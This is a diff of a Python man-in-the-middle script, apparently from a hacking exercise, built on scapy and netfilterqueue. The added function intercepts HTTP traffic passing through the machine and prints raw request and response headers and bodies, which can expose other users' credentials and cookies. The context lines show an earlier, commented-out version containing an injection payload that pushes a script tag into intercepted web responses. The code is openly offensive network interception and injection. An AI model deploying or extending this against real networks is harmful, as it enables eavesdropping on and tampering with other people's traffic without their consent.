@@ -1,6 +1,39 @@
 import scapy.all as scapy
 import traceback # Import the traceback module for detailed errors
 import netfilterqueue
+
+def process_packet(packet):
+    """
+    DEBUGGING VERSION: This function just prints the contents of HTTP packets
+    and does not modify them.
+    """
+    try:
+        scapy_packet = scapy.IP(packet.get_payload())
+        if scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(scapy.Raw):
+            load = scapy_packet[scapy.Raw].load
+
+            # Check for outgoing HTTP requests
+            if scapy_packet[scapy.TCP].dport == 80:
+                print("\n\n=============== HTTP REQUEST INTERCEPTED ===============\n")
+                # Try to decode and print the raw request headers and body
+                print(load.decode('latin-1', errors='ignore'))
+                print("\n========================================================\n\n")
+
+            # Check for incoming HTTP responses
+            elif scapy_packet[scapy.TCP].sport == 80:
+                print("\n\n=============== HTTP RESPONSE INTERCEPTED ===============\n")
+                # Try to decode and print the raw response headers and body
+                print(load.decode('latin-1', errors='ignore'))
+                print("\n=========================================================\n\n")
+
+    except Exception:
+        # This will catch any errors during scapy parsing
+        print("[!!!] Packet parsing failed. [!!!]")
+        traceback.print_exc()
+    
+    # Always accept the packet to keep the connection alive
+    packet.accept()
+
 """
 INJECTION_SCRIPT = b"<script>alert('MitM by Syn-apse!')</script>" 
 def process_packet(packet): 
